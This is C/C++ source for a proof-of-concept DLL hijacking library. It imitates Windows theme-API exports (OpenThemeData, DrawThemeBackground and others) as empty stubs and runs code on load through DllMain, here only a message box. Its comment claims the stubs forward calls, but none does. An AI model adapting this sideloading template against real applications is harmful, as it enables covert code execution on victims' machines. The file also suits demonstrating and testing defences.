#include <windows.h>

int Main() {
    MessageBoxW(0, L"DLL Hijacking", L"Hello", 0);
    return 1;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        Main();  // Call on DLL load
    }
    return TRUE;
}

// Match actual function signatures (simplified - just forward)
extern "C" {
    __declspec(dllexport) void* __stdcall OpenThemeData(void* hwnd, void* pszClassList) { return NULL; }
    __declspec(dllexport) void __stdcall CloseThemeData(void* hTheme) {}
    __declspec(dllexport) void __stdcall DrawThemeBackground(void* a, void* b, int c, int d, void* e, void* f) {}
    __declspec(dllexport) void __stdcall GetThemeBackgroundContentRect(void* a, void* b, int c, int d, void* e, void* f) {}
    __declspec(dllexport) void __stdcall GetThemePartSize(void* a, void* b, int c, int d, void* e, int f, void* g) {}
    __declspec(dllexport) void __stdcall GetThemeFont(void* a, void* b, int c, int d, int e, void* f) {}
    __declspec(dllexport) void __stdcall SetWindowTheme(void* hwnd, void* pszSubAppName, void* pszSubIdList) {}
    __declspec(dllexport) void __stdcall EnableThemeDialogTexture(void* hwnd, DWORD dwFlags) {}
    __declspec(dllexport) void __stdcall DrawThemeParentBackground(void* a, void* b, void* c) {}
    __declspec(dllexport) void __stdcall GetThemeTransitionDuration(void* a, int b, int c, int d, int e, void* f) {}
    __declspec(dllexport) void __stdcall BufferedPaintRenderAnimation(void* a, void* b) {}
    __declspec(dllexport) void __stdcall EndBufferedAnimation(void* a, BOOL b) {}
    __declspec(dllexport) void* __stdcall BeginBufferedAnimation(void* a, void* b, void* c, int d, void* e, void* f, void* g) { return NULL; }
    __declspec(dllexport) void __stdcall BufferedPaintStopAllAnimations(void* hwnd) {}
    __declspec(dllexport) void __stdcall DrawThemeTextEx(void* a, void* b, int c, int d, void* e, int f, DWORD g, void* h, void* i) {}
}